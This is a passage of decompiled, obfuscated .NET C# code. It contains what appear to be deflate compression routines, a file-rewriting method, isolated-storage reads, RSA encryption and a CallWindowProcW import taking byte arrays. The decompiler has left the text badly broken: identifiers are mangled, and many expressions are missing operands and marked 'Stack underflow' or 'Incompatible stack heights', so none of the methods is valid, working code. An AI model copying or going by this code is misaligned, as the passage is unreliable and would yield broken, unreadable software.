			return (ResourceManager)/*Error near IL_005d: Stack underflow*/;
		}

		unsafe static int _0001(int P_0, byte[] P_1, int P_2, global::_0008._0004._0003 P_3)
		{
			//IL_0029: Invalid comparison between Unknown and I4
			//IL_0052: Unknown result type (might be due to invalid IL or missing references)
			//IL_0054: Unknown result type (might be due to invalid IL or missing references)
			//IL_005a: Unknown result type (might be due to invalid IL or missing references)
			//IL_005c: Expected I4, but got Unknown
			//IL_00d8: Incompatible stack heights: 0 vs 1
			//IL_00de: Incompatible stack heights: 0 vs 1
			//IL_00e4: Incompatible stack heights: 0 vs 1
			//IL_00ea: Incompatible stack heights: 0 vs 1
			//IL_00f0: Incompatible stack heights: 0 vs 1
			//IL_00f6: Incompatible stack heights: 0 vs 1
			//IL_00fc: Incompatible stack heights: 0 vs 1
			//IL_0102: Incompatible stack heights: 0 vs 2
			void* ptr = stackalloc byte[16];
			try
			{
				int num = ((global::_0008._0004._0003)/*Error near IL_0019: Stack underflow*/)._0001;
				*(int*)(nint)/*Error near IL_001a: Stack underflow*/ = num;
				int num2 = ((global::_0008._0004._0003)/*Error near IL_0029: Stack underflow*/)._0002;
				if ((int)/*Error near IL_002b: Stack underflow*/ > num2)
				{
					P_2 = ((global::_0008._0004._0003)/*Error near IL_0035: Stack underflow*/)._0002;
				}
				else
				{
					_ = ((global::_0008._0004._0003)/*Error near IL_0048: Stack underflow*/)._0001;
					int num3 = ((global::_0008._0004._0003)/*Error near IL_0052: Stack underflow*/)._0002;
					_003F val = /*Error near IL_0053: Stack underflow*/- num3;
					*(int*)(nint)/*Error near IL_005c: Stack underflow*/ = (val + P_2) & 0x7FFF;
				}
				while (true)
				{
					*(int*)((byte*)ptr + 4) = P_2;
					*(int*)((byte*)ptr + 8) = P_2 - *(int*)ptr;
					if (*(int*)((byte*)ptr + 8) <= 0)
					{
						break;
					}
					Array.Copy(P_3._0001, 32768 - *(int*)((byte*)ptr + 8), P_1, P_0, *(int*)((byte*)ptr + 8));
					P_0 += *(int*)((byte*)ptr + 8);
					if (0 == 0)
					{
						P_2 = *(int*)ptr;
						break;
					}
				}
				Array.Copy(P_3._0001, *(int*)ptr - P_2, P_1, P_0, P_2);
				P_3._0002 -= *(int*)((byte*)ptr + 4);
				if (P_3._0002 < 0)
				{
					throw new InvalidOperationException();
				}
				*(int*)((byte*)ptr + 12) = *(int*)((byte*)ptr + 4);
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)(*(int*)ptr), (object)(*(int*)((byte*)ptr + 4)), (object)(*(int*)((byte*)ptr + 8)), (object)P_3, (object)P_1, (object)P_0, (object)P_2);
				throw;
			}
			return *(int*)((byte*)ptr + 12);
		}

		unsafe static bool _0001(bool P_0, bool P_1, global::_0008._0004._0008 P_2)
		{
			//IL_001f: Invalid comparison between Unknown and I4
			//IL_004b: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 1
			//IL_0058: Incompatible stack heights: 0 vs 1
			//IL_005b: Incompatible stack heights: 0 vs 2
			//IL_0061: Incompatible stack heights: 0 vs 1
			//IL_0064: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[2];
			bool flag = default(bool);
			try
			{
				do
				{
					_0011._0001((global::_0008._0004._0008)/*Error near IL_0052: Stack underflow*/);
					int num2;
					if ((int)/*Error near IL_0011: Stack underflow*/ != 0)
					{
						_ = ((global::_0008._0004._0008)/*Error near IL_0018: Stack underflow*/)._0008;
						int num = ((global::_0008._0004._0008)/*Error near IL_001f: Stack underflow*/)._000E;
						num2 = (((int)/*Error near IL_0021: Stack underflow*/ == num) ? 1 : 0);
					}
					else
					{
						num2 = 0;
					}
					flag = (byte)num2 != 0;
					bool num3 = _0011._0001((byte)/*Error near IL_0031: Stack underflow*/ != 0, flag, P_2);
					*(bool*)(nint)/*Error near IL_0032: Stack underflow*/ = num3;
				}
				while (_0011._0001(P_2._0001) & *(bool*)ptr);
				((byte*)ptr)[1] = *(byte*)ptr;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)(*(bool*)ptr), (object)flag, (object)P_2, (object)P_1, (object)P_0);
				throw;
			}
			return ((byte*)ptr)[1] != 0;
		}

		static void _0001(global::_0008._0005 P_0, bool P_1)
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			//IL_000e: Incompatible stack heights: 0 vs 1
			((global::_0008._0005)/*Error near IL_0009: Stack underflow*/)._0001 = (byte)/*Error near IL_0009: Stack underflow*/ != 0;
		}

		static void _0001(global::_0006._0001 P_0, string P_1)
		{
			//IL_00ed: Incompatible stack heights: 0 vs 1
			//IL_00f7: Incompatible stack heights: 0 vs 1
			//IL_0103: Incompatible stack heights: 0 vs 2
			//IL_010d: Incompatible stack heights: 0 vs 1
			//IL_0119: Incompatible stack heights: 0 vs 1
			//IL_0123: Incompatible stack heights: 0 vs 1
			Stream stream = default(Stream);
			byte[] array = default(byte[]);
			BinaryReader binaryReader = default(BinaryReader);
			BinaryWriter binaryWriter = default(BinaryWriter);
			try
			{
				new FileStream((string)/*Error near IL_00f7: Stack underflow*/, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
				stream = (Stream)/*Error near IL_00fd: Stack underflow*/;
				if (false)
				{
					return;
				}
				_ = _008A._007E_0010_0003;
				/*Error near IL_010d: Stack underflow*/((object)/*Error near IL_010d: Stack underflow*/);
				array = new byte[checked((nint)/*Error near IL_0028: Stack underflow*/)];
				new BinaryReader((Stream)/*Error near IL_0123: Stack underflow*/);
				binaryReader = (BinaryReader)/*Error near IL_0129: Stack underflow*/;
				try
				{
					binaryWriter = new BinaryWriter(stream);
					try
					{
						_0014_0003._007E_0004_0006(_0013_0003._007E_0002_0006(binaryReader), 0L);
						if (5u != 0)
						{
							array = _0015_0003._007E_0005_0006(binaryReader, (int)_008A._007E_0010_0003(stream));
							_0014_0003._007E_0004_0006(_0013_0003._007E_0003_0006(binaryWriter), 0L);
							array = _0011._0001(_0011._0001(P_0, P_0._0001()), array, P_0);
						}
						_0016_0003._007E_0006_0006(binaryWriter, array);
					}
					finally
					{
						if (binaryWriter != null)
						{
							global::_000F._007E_0099(binaryWriter);
						}
					}
				}
				finally
				{
					if (binaryReader != null)
					{
						global::_000F._007E_0099(binaryReader);
					}
				}
				do
				{
					global::_000F._007E_009E(stream);
				}
				while (false);
				global::_000F._007E_000E_0002(stream);
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)stream, (object)array, (object)binaryReader, (object)binaryWriter, (object)P_0, (object)P_1);
				throw;
			}
		}

		unsafe static void _0001(global::_0008._0004._0007._0001 P_0, global::_0008._0004._0007._0001 P_1)
		{
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_0020: Unknown result type (might be due to invalid IL or missing references)
			//IL_0035: Unknown result type (might be due to invalid IL or missing references)
			//IL_0047: Unknown result type (might be due to invalid IL or missing references)
			//IL_0058: Unknown result type (might be due to invalid IL or missing references)
			//IL_0167: Incompatible stack heights: 0 vs 1
			//IL_016d: Incompatible stack heights: 0 vs 1
			//IL_0179: Incompatible stack heights: 0 vs 1
			//IL_017f: Incompatible stack heights: 0 vs 2
			//IL_0185: Incompatible stack heights: 0 vs 2
			//IL_018b: Incompatible stack heights: 0 vs 1
			//IL_0191: Incompatible stack heights: 0 vs 1
			if (false)
			{
				return;
			}
			void* ptr = stackalloc byte[20];
			int num = default(int);
			try
			{
				while (true)
				{
					*(int*)(nint)(/*Error near IL_0017: Stack underflow*/ + 8) = -1;
					*(int*)(nint)(/*Error near IL_0021: Stack underflow*/ + 12) = 0;
					while (true)
					{
						if (*(int*)((byte*)ptr + 12) >= P_1._0002)
						{
							return;
						}
						num = 1;
						_ = /*Error near IL_0036: Stack underflow*/+ 16;
						_ = ((global::_0008._0004._0007._0001)/*Error near IL_0040: Stack underflow*/)._0001;
						int num2 = *(int*)(nint)(/*Error near IL_0048: Stack underflow*/ + 12);
						byte num3 = ((byte[])/*Error near IL_004a: Stack underflow*/)[num2];
						*(int*)(nint)/*Error near IL_004b: Stack underflow*/ = num3;
						if (8 == 0)
						{
							return;
						}
						if (*(int*)(nint)(/*Error near IL_0059: Stack underflow*/ + 16) == 0)
						{
							*(int*)(nint)/*Error near IL_0067: Stack underflow*/ = 138;
							*(int*)((byte*)ptr + 4) = 3;
						}
						else
						{
							*(int*)ptr = 6;
							*(int*)((byte*)ptr + 4) = 3;
							if (*(int*)((byte*)ptr + 8) != *(int*)((byte*)ptr + 16))
							{
								P_0._0001[*(int*)((byte*)ptr + 16)]++;
								num = 0;
							}
						}
						*(int*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 16);
						if (3 == 0)
						{
							break;
						}
						(*(int*)((byte*)ptr + 12))++;
						while (*(int*)((byte*)ptr + 12) < P_1._0002 && *(int*)((byte*)ptr + 8) == P_1._0001[*(int*)((byte*)ptr + 12)])
						{
							(*(int*)((byte*)ptr + 12))++;
							if (++num >= *(int*)ptr)
							{
								break;
							}
						}
						while (true)
						{
							if (num < *(int*)((byte*)ptr + 4))
							{
								if (2u != 0)
								{
									P_0._0001[*(int*)((byte*)ptr + 8)] += (short)num;
									break;
								}
								continue;
							}
							if (*(int*)((byte*)ptr + 8) != 0)
							{
								P_0._0001[16]++;
							}
							else if (num <= 10)
							{
								P_0._0001[17]++;
							}
							else
							{
								P_0._0001[18]++;
							}
							break;
						}
					}
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)(*(int*)ptr), (object)(*(int*)((byte*)ptr + 4)), (object)num, (object)(*(int*)((byte*)ptr + 8)), (object)(*(int*)((byte*)ptr + 12)), (object)(*(int*)((byte*)ptr + 16)), (object)P_1, (object)P_0);
				throw;
			}
		}

		static void _0001(global::_0006._0007 P_0)
		{
			//IL_0039: Incompatible stack heights: 0 vs 1
			//IL_003c: Incompatible stack heights: 0 vs 1
			//IL_0043: Incompatible stack heights: 0 vs 1
			//IL_0046: Incompatible stack heights: 0 vs 1
			//IL_0050: Incompatible stack heights: 0 vs 1
			//IL_0059: Incompatible stack heights: 0 vs 1
			try
			{
				if (((global::_0006._0007)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					_0011._0001();
					((global::_0006._0007)/*Error near IL_0012: Stack underflow*/)._0001 = (_000E)/*Error near IL_0012: Stack underflow*/;
				}
				((global::_0006._0007)/*Error near IL_004d: Stack underflow*/)._0001();
				byte[] array = ((global::_0006._0007)/*Error near IL_001d: Stack underflow*/)._0001;
				do
				{
					global::_0008._0006._0003 obj = global::_0008._0006._0003._0001;
					if (0 == 0)
					{
						_0011._0001((byte[])/*Error near IL_0032: Stack underflow*/, (global::_0008._0006)P_0, obj);
					}
				}
				while (false);
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0);
				throw;
			}
		}

		static _000E _0001()
		{
			//IL_015d: Incompatible stack heights: 0 vs 5
			//IL_0167: Incompatible stack heights: 0 vs 1
			//IL_0171: Incompatible stack heights: 0 vs 1
			//IL_0195: Incompatible stack heights: 0 vs 1
			//IL_01a5: Incompatible stack heights: 0 vs 1
			ulong[] array = default(ulong[]);
			Dictionary<string, ulong> dictionary = default(Dictionary<string, ulong>);
			string[] array2 = default(string[]);
			int i = default(int);
			string text = default(string);
			string text2 = default(string);
			ulong[] array3 = default(ulong[]);
			string text3 = default(string);
			IsolatedStorageFileStream isolatedStorageFileStream = default(IsolatedStorageFileStream);
			byte[] array4 = default(byte[]);
			try
			{
				_0011._0001(global::_0002._000E._0002);
				array = (ulong[])/*Error near IL_019b: Stack underflow*/;
				new Dictionary<string, ulong>();
				dictionary = (Dictionary<string, ulong>)/*Error near IL_01ab: Stack underflow*/;
				try
				{
					_ = _0093_0003._007E_008A_0006;
					_ = global::_0002._000E._0001;
					_ = global::_0004._001A;
					_ = global::_0002._000E._0003;
					global::_000E._0003._0001(107391194);
					/*Error near IL_0167: Stack underflow*/((string)/*Error near IL_0167: Stack underflow*/, (string)/*Error near IL_0167: Stack underflow*/);
					/*Error near IL_0171: Stack underflow*/((object)/*Error near IL_0171: Stack underflow*/, (string)/*Error near IL_0171: Stack underflow*/);
					array2 = (string[])/*Error near IL_0177: Stack underflow*/;
					for (i = 0; i < array2.Length; i++)
					{
						text = array2[i];
						text2 = global::_0006._001F(text);
						array3 = _0011._0001(global::_0004._001A(global::_0002._000E._0003, text));
						text3 = global::_0004._001A(global::_0002._000E._0003, global::_0004._0019(text2, global::_000E._0003._0001(107396618)));
						isolatedStorageFileStream = null;
						try
						{
							isolatedStorageFileStream = _0011._0001(FileAccess.Read, FileMode.Open, text3);
							array4 = new byte[_008A._007E_0010_0003(isolatedStorageFileStream)];
							_008C._007E_0012_0003(isolatedStorageFileStream, array4, 0, array4.Length);
							text2 = _0083._007E_0005_0003(global::_0002._000E._0001, array4);
						}
						catch (FileNotFoundException)
						{
							text2 = _0083._007E_0005_0003(global::_0002._000E._0001, _0019_0003._000E_0006(_0017_0003._007E_0007_0006(_0017_0003._007E_0007_0006(text2, '@', '\\'), '#', '/')));
						}
						finally
						{
							if (isolatedStorageFileStream != null)
							{
								global::_000F._007E_009E(isolatedStorageFileStream);
							}
						}
						dictionary[text2] = array3[0];
					}
				}
				catch (DirectoryNotFoundException)
				{
				}
				return new _000E(array, dictionary);
			}
			catch (Exception ex3)
			{
				_0011._0001(ex3, (object)array, (object)dictionary, (object)array2, (object)i, (object)text, (object)text2, (object)array3, (object)text3, (object)isolatedStorageFileStream, (object)array4);
				throw;
			}
		}

		[DllImport("user32", CharSet = CharSet.Unicode, EntryPoint = "CallWindowProcW", ExactSpelling = true, SetLastError = true)]
		static extern IntPtr _0001([In] byte[] _0002, IntPtr _0003, int _0004, [In][Out] byte[] _0005, IntPtr _0006);

		static bool _0001(_0006 P_0)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((_0006)/*Error near IL_0007: Stack underflow*/)._0001;
		}

		static void _0001(global::_0008._0004._0003 P_0, int P_1, int P_2)
		{
			//IL_001d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0023: Expected I4, but got Unknown
			//IL_0065: Incompatible stack heights: 0 vs 1
			//IL_006b: Incompatible stack heights: 0 vs 2
			//IL_006e: Incompatible stack heights: 0 vs 1
			//IL_0074: Incompatible stack heights: 0 vs 1
			//IL_0077: Incompatible stack heights: 0 vs 1
			//IL_007a: Incompatible stack heights: 0 vs 1
			//IL_007e: Incompatible stack heights: 0 vs 2
			//IL_0081: Incompatible stack heights: 0 vs 1
			int num = default(int);
			try
			{
				while (true)
				{
					if (false)
					{
						goto IL_0005;
					}
					goto IL_0053;
					IL_0005:
					if (false)
					{
						continue;
					}
					_ = ((global::_0008._0004._0003)/*Error near IL_000f: Stack underflow*/)._0001;
					num = ((global::_0008._0004._0003)/*Error near IL_0018: Stack underflow*/)._0001;
					_003F val = /*Error near IL_001e: Stack underflow*/+ 1;
					((global::_0008._0004._0003)/*Error near IL_0023: Stack underflow*/)._0001 = (int)val;
					_ = ((global::_0008._0004._0003)/*Error near IL_002c: Stack underflow*/)._0001;
					P_1++;
					byte num2 = ((byte[])/*Error near IL_0033: Stack underflow*/)[/*Error near IL_0033: Stack underflow*/];
					((sbyte[])/*Error near IL_0034: Stack underflow*/)[/*Error near IL_0034: Stack underflow*/] = (sbyte)num2;
					int num3 = P_0._0001;
					((global::_0008._0004._0003)/*Error near IL_0047: Stack underflow*/)._0001 = num3 & 0x7FFF;
					int num4 = P_1;
					goto IL_0048;
					IL_0053:
					num4 = P_2;
					int num5 = num4 - 1;
					if (2u != 0)
					{
						P_2 = num5;
						if (num4 <= 0)
						{
							break;
						}
						goto IL_0005;
					}
					goto IL_004d;
					IL_0048:
					num5 = 32767;
					goto IL_004d;
					IL_004d:
					num4 &= num5;
					if (false)
					{
						goto IL_0048;
					}
					P_1 = num4;
					goto IL_0053;
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)num, (object)P_0, (object)P_1, (object)P_2);
				throw;
			}
		}

		static int _0001()
		{
			//IL_0012: Incompatible stack heights: 0 vs 1
			global::_0001._007E_0002(global::_000E._0002._0001);
			return (int)/*Error near IL_000d: Stack underflow*/;
		}

		unsafe static bool _0001()
		{
			//IL_001c: Invalid comparison between Unknown and I4
			//IL_0038: Unknown result type (might be due to invalid IL or missing references)
			//IL_0049: Unknown result type (might be due to invalid IL or missing references)
			//IL_004d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0053: Incompatible stack heights: 0 vs 1
			//IL_005a: Incompatible stack heights: 0 vs 1
			//IL_005d: Incompatible stack heights: 0 vs 1
			//IL_0067: Incompatible stack heights: 0 vs 1
			//IL_006e: Incompatible stack heights: 0 vs 2
			//IL_0071: Incompatible stack heights: 0 vs 1
			//IL_0074: Incompatible stack heights: 0 vs 2
			int num = 3;
			if (num != 0)
			{
				byte* num2 = stackalloc byte[num];
				void* ptr = default(void*);
				if (0 == 0)
				{
					ptr = num2;
				}
				try
				{
					while (true)
					{
						_ = global::_0002._0010._0001.HasValue;
						bool num3 = (int)/*Error near IL_001e: Stack underflow*/ == 0;
						*(bool*)(nint)/*Error near IL_001f: Stack underflow*/ = num3;
						if (*(bool*)(nint)/*Error near IL_0022: Stack underflow*/)
						{
							while (0 == 0)
							{
								if (false)
								{
									goto end_IL_0014;
								}
								global::_0002._0010._0001();
								if (-1 == 0)
								{
									continue;
								}
								goto IL_0032;
							}
							continue;
						}
						goto IL_0032;
						IL_0032:
						if (0 == 0)
						{
							_ = /*Error near IL_0039: Stack underflow*/+ 1;
							_ = global::_0002._0010._0001.Value;
							*(_003F*)(nint)/*Error near IL_0041: Stack underflow*/ = /*Error near IL_0041: Stack underflow*/;
							if (0 == 0)
							{
								_ = /*Error near IL_004a: Stack underflow*/+ 2;
								sbyte num4 = *(sbyte*)(nint)(/*Error near IL_004e: Stack underflow*/ + 1);
								*(sbyte*)(nint)/*Error near IL_0050: Stack underflow*/ = num4;
								break;
							}
						}
						continue;
						end_IL_0014:
						break;
					}
				}
				catch (Exception ex)
				{
					_0011._0001(ex, (object)(*(bool*)ptr), (object)(((byte*)ptr)[1] != 0));
					throw;
				}
				num = ((byte*)ptr)[2];
			}
			return (byte)num != 0;
		}

		static void _0001(global::_0003._0008 P_0, string P_1)
		{
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_002d: Incompatible stack heights: 0 vs 1
			//IL_0051: Incompatible stack heights: 0 vs 2
			object obj = default(object);
			try
			{
				try
				{
					do
					{
						if (2 == 0)
						{
							continue;
						}
						obj = global::_0003._0008._0001;
						if (false)
						{
							continue;
						}
						_ = _0092_0002._001B_0005;
						/*Error near IL_0058: Stack underflow*/((object)/*Error near IL_0058: Stack underflow*/);
						try
						{
							_0011._0001((global::_0003._0008)/*Error near IL_002a: Stack underflow*/);
							if (0 == 0)
							{
								_0011._0001((string)/*Error near IL_0034: Stack underflow*/);
							}
						}
						finally
						{
							do
							{
								if (5u != 0)
								{
									_0092_0002._001C_0005(obj);
								}
							}
							while (false);
						}
					}
					while (-1 == 0);
				}
				catch
				{
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, obj, (object)P_0, (object)P_1);
				throw;
			}
		}

		static void _0001(global::_0008._0004._000F P_0, int P_1)
		{
			//IL_000c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_001b: Unknown result type (might be due to invalid IL or missing references)
			//IL_002b: Incompatible stack heights: 0 vs 1
			//IL_002e: Incompatible stack heights: 0 vs 1
			//IL_0038: Incompatible stack heights: 0 vs 1
			//IL_003b: Incompatible stack heights: 0 vs 1
			try
			{
				while (true)
				{
					if (uint.MaxValue != 0)
					{
						_003F val = /*Error near IL_000d: Stack underflow*/& 0xFF;
						((Stream)/*Error near IL_0035: Stack underflow*/).WriteByte((byte)val);
						goto IL_0014;
					}
					goto IL_001f;
					IL_0014:
					_003F val2 = /*Error near IL_0016: Stack underflow*/>> 8;
					((Stream)/*Error near IL_0042: Stack underflow*/).WriteByte((byte)(val2 & 0xFF));
					goto IL_001f;
					IL_001f:
					if (false ? true : false)
					{
						goto IL_0014;
					}
					if (uint.MaxValue != 0)
					{
						break;
					}
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0, (object)P_1);
				throw;
			}
		}

		unsafe static int _0001(global::_0008._0004._0003 P_0, global::_0008._0004._0002 P_1, int P_2)
		{
			//IL_0021: Unknown result type (might be due to invalid IL or missing references)
			//IL_0041: Unknown result type (might be due to invalid IL or missing references)
			//IL_0051: Incompatible stack heights: 0 vs 1
			//IL_0057: Invalid comparison between Unknown and I4
			//IL_00d8: Incompatible stack heights: 0 vs 1
			//IL_00de: Incompatible stack heights: 0 vs 2
			//IL_00e8: Expected I4, but got Unknown
			//IL_00e8: Incompatible stack heights: 0 vs 1
			//IL_00ee: Incompatible stack heights: 0 vs 1
			//IL_0102: Incompatible stack heights: 0 vs 1
			//IL_010f: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[12];
			try
			{
				int num = 32768;
				if (num != 0)
				{
					int num2 = ((global::_0008._0004._0003)/*Error near IL_0021: Stack underflow*/)._0002;
					Math.Min(val2: /*Error near IL_0022: Stack underflow*/- num2, val1: (int)/*Error near IL_00e8: Stack underflow*/);
					num = _0011._0001((global::_0008._0004._0002)/*Error near IL_00f8: Stack underflow*/);
				}
				Math.Min((int)/*Error near IL_0102: Stack underflow*/, num);
				while (true)
				{
					P_2 = (int)/*Error near IL_0109: Stack underflow*/;
					while (true)
					{
						*(int*)(nint)(/*Error near IL_0042: Stack underflow*/ + 4) = 32768 - P_0._0001;
						if (false)
						{
							break;
						}
						int num3 = *(int*)((byte*)ptr + 4);
						if ((int)/*Error near IL_0059: Stack underflow*/ > num3)
						{
							*(int*)ptr = _0011._0001(P_1, P_0._0001, P_0._0001, *(int*)((byte*)ptr + 4));
							if (*(int*)ptr == *(int*)((byte*)ptr + 4))
							{
								*(int*)ptr += _0011._0001(P_1, P_0._0001, 0, P_2 - *(int*)((byte*)ptr + 4));
							}
						}
						else
						{
							if (false)
							{
								continue;
							}
							*(int*)ptr = _0011._0001(P_1, P_0._0001, P_0._0001, P_2);
						}
						P_0._0001 = (P_0._0001 + *(int*)ptr) & 0x7FFF;
						P_0._0002 += *(int*)ptr;
						*(int*)((byte*)ptr + 8) = *(int*)ptr;
						goto end_IL_0107;
					}
					continue;
					end_IL_0107:
					break;
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)(*(int*)ptr), (object)(*(int*)((byte*)ptr + 4)), (object)P_0, (object)P_1, (object)P_2);
				throw;
			}
			return *(int*)((byte*)ptr + 8);
		}

		static global::_0008._0004._0004 _0001(global::_0008._0004._0005 P_0)
		{
			//IL_002e: Incompatible stack heights: 0 vs 1
			//IL_0034: Incompatible stack heights: 0 vs 1
			//IL_0037: Incompatible stack heights: 0 vs 3
			//IL_003a: Incompatible stack heights: 0 vs 2
			//IL_0044: Incompatible stack heights: 0 vs 1
			//IL_004b: Incompatible stack heights: 0 vs 1
			byte[] array = default(byte[]);
			try
			{
				do
				{
					array = new byte[((global::_0008._0004._0005)/*Error near IL_0007: Stack underflow*/)._0002];
				}
				while (false);
				_ = ((global::_0008._0004._0005)/*Error near IL_0018: Stack underflow*/)._0002;
				_ = 0;
				_ = 0;
				Array.Copy(length: ((global::_0008._0004._0005)/*Error near IL_0023: Stack underflow*/)._0002, sourceArray: (Array)/*Error near IL_0041: Stack underflow*/, sourceIndex: (int)/*Error near IL_0041: Stack underflow*/, destinationArray: (Array)/*Error near IL_0041: Stack underflow*/, destinationIndex: (int)/*Error near IL_0041: Stack underflow*/);
				new global::_0008._0004._0004((byte[])/*Error near IL_004b: Stack underflow*/);
				return (global::_0008._0004._0004)/*Error near IL_004d: Stack underflow*/;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)array, (object)P_0);
				throw;
			}
		}

		[SecurityPermission(SecurityAction.Demand, UnmanagedCode = true)]
		static void _0001(global::_000F._0003 P_0)
		{
			//IL_0045: Incompatible stack heights: 0 vs 1
			//IL_0048: Incompatible stack heights: 0 vs 1
			//IL_004f: Incompatible stack heights: 0 vs 2
			//IL_0052: Incompatible stack heights: 0 vs 1
			//IL_005c: Incompatible stack heights: 0 vs 2
			do
			{
				IL_0002:
				if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
				{
					global::_000F._0003._0001 = (global::_000F._0003)/*Error near IL_000b: Stack underflow*/;
					_ = _009B_0003._007E_0092_0006;
					_001A_0002._0081_0004();
					UnhandledExceptionEventHandler unhandledExceptionEventHandler = ((global::_000F._0003)/*Error near IL_0024: Stack underflow*/)._0001;
					/*Error near IL_0059: Stack underflow*/((object)/*Error near IL_0059: Stack underflow*/, unhandledExceptionEventHandler);
					if (3 == 0)
					{
						goto IL_0002;
					}
					_ = _009C_0003._0093_0006;
					ThreadExceptionEventHandler threadExceptionEventHandler = ((global::_000F._0003)/*Error near IL_003b: Stack underflow*/)._0001;
					if (0 == 0)
					{
						/*Error near IL_0063: Stack underflow*/(threadExceptionEventHandler);
					}
				}
			}
			while (7 == 0);
		}

		static byte[] _0001(string P_0, global::_0006._0001 P_1, byte[] P_2, int P_3)
		{
			//IL_00fc: Incompatible stack heights: 0 vs 1
			//IL_0102: Incompatible stack heights: 0 vs 1
			//IL_010c: Incompatible stack heights: 0 vs 1
			//IL_0116: Incompatible stack heights: 0 vs 1
			//IL_0120: Incompatible stack heights: 0 vs 1
			//IL_0126: Incompatible stack heights: 0 vs 1
			//IL_012c: Incompatible stack heights: 0 vs 1
			//IL_0136: Incompatible stack heights: 0 vs 1
			int num = default(int);
			RSACryptoServiceProvider rSACryptoServiceProvider = default(RSACryptoServiceProvider);
			byte[] array = default(byte[]);
			try
			{
				if ((int)/*Error near IL_0007: Stack underflow*/ == 0 || ((Array)/*Error near IL_000d: Stack underflow*/).Length == 0)
				{
					global::_000E._0003._0001(107391264);
					global::_000E._0003._0001(107391243);
					new ArgumentException((string?)/*Error near IL_0120: Stack underflow*/, (string?)/*Error near IL_0120: Stack underflow*/);
					throw /*Error near IL_0029: Stack underflow*/;
				}
				_0011._0001((global::_0006._0001)/*Error near IL_0136: Stack underflow*/, (int)/*Error near IL_0136: Stack underflow*/);
				num = (int)/*Error near IL_013c: Stack underflow*/;
				do
				{
					if (1 == 0 || P_2.Length > num)
					{
						throw new ArgumentException(_0018_0002._007F_0004(global::_000E._0003._0001(107391234), num), global::_000E._0003._0001(107391243));
					}
				}
				while (false);
				if (!_0011._0001(P_1, P_3))
				{
					throw new ArgumentException(global::_000E._0003._0001(107390717), global::_000E._0003._0001(107390656));
				}
				int num2 = (_0015._0094_0002(P_0) ? 1 : 0);
				do
				{
					if (num2 != 0)
					{
						throw new ArgumentException(global::_000E._0003._0001(107390675), global::_000E._0003._0001(107390646));
					}
					num2 = P_3;
				}
				while (false);
				rSACryptoServiceProvider = new RSACryptoServiceProvider(num2);
				try
				{
					global::_0011._007E_001E_0002(rSACryptoServiceProvider, P_0);
					array = _009A_0002._007E_0088_0005(rSACryptoServiceProvider, P_2, P_1._0001);
					return array;
				}
				finally
				{
					if (rSACryptoServiceProvider != null)
					{
						global::_000F._007E_0099(rSACryptoServiceProvider);
					}
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)num, (object)rSACryptoServiceProvider, (object)array, (object)P_1, (object)P_2, (object)P_3, (object)P_0);
				throw;
			}
		}

		unsafe static bool _0001(int P_0, global::_0008._0004._0007 P_1)
		{
			//IL_0066: Incompatible stack heights: 0 vs 1
			//IL_0069: Incompatible stack heights: 0 vs 2
			//IL_006c: Incompatible stack heights: 0 vs 1
			//IL_006f: Incompatible stack heights: 0 vs 2
			//IL_0072: Incompatible stack heights: 0 vs 1
			//IL_0075: Incompatible stack heights: 0 vs 1
			//IL_0078: Incompatible stack heights: 0 vs 1
			//IL_007b: Incompatible stack heights: 0 vs 1
			int num = 5;
			if (num != 0)
			{
				void* ptr = stackalloc byte[num];
				try
				{
					_ = ((global::_0008._0004._0007)/*Error near IL_0016: Stack underflow*/)._0001;
					int num2 = ((global::_0008._0004._0007)/*Error near IL_001d: Stack underflow*/)._0001;
					((short[])/*Error near IL_001f: Stack underflow*/)[num2] = 0;
					_ = ((global::_0008._0004._0007)/*Error near IL_0026: Stack underflow*/)._0002;
					int num3 = ((global::_0008._0004._0007)/*Error near IL_0031: Stack underflow*/)._0001;
					*(int*)(nint)/*Error near IL_0032: Stack underflow*/ = num3;
					int num4 = *(int*)(nint)/*Error near IL_0035: Stack underflow*/;
					((global::_0008._0004._0007)/*Error near IL_003c: Stack underflow*/)._0001 = num4 + 1;
					int num5 = *(int*)(nint)/*Error near IL_003f: Stack underflow*/;
					((sbyte[])/*Error near IL_0042: Stack underflow*/)[num5] = (sbyte)(byte)P_0;
					P_1._0001._0001[P_0]++;
					((byte*)ptr)[4] = (_0011._0001(P_1) ? ((byte)1) : ((byte)0));
				}
				catch (Exception ex)
				{
					_0011._0001(ex, (object)(*(int*)ptr), (object)P_1, (object)P_0);
					throw;
				}
				num = ((byte*)ptr)[4];
			}
			return (byte)num != 0;
		}

		unsafe static void _0001(global::_0006._0005 P_0)
		{
			//IL_006a: Incompatible stack heights: 0 vs 2
			//IL_0071: Incompatible stack heights: 0 vs 1
			//IL_0077: Incompatible stack heights: 0 vs 2
			//IL_007e: Incompatible stack heights: 0 vs 1
			//IL_009b: Incompatible stack heights: 0 vs 2
			//IL_00a5: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[8];
			try
			{
				if (false)
				{
					return;
				}
				_ = _009D_0003._0094_0006;
				/*Error near IL_00a5: Stack underflow*/((object)/*Error near IL_00a5: Stack underflow*/);
